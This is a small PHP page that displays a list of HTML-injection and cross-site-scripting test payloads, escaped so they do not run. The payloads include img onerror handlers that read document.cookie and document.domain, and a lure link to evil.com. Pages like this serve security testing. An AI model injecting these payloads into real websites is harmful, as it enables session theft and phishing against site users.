<?php
// Array of payloads
$payloads = [
    '<h1>htmlinjection</h1>',
    '<h1 style="color:red">htmlinjection</h1>',
    '<img src="/onerror=.1|alert(document.domain)>"',
    '<img src="/onerror=.1|alert(document.cookie)>"',
    '<img src="q" onerror="prompt(document.domain)">',
    '<h1><a href="https://evil.com/">CLICKTHIS</a></h1>'
];

// Function to safely display payloads
function displayPayloads($payloads) {
    foreach ($payloads as $payload) {
        echo '<div style="margin-bottom: 20px;">';
        echo '<pre>' . htmlspecialchars($payload, ENT_QUOTES, 'UTF-8') . '</pre>';
        echo '</div>';
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTML Injection Payloads</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background: #f4f4f4;
        }
        h1 {
            color: #333;
        }
        pre {
            background: #fff;
            border: 1px solid #ddd;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <h1>HTML Injection Payloads</h1>
    <?php displayPayloads($payloads); ?>
</body>
</html>
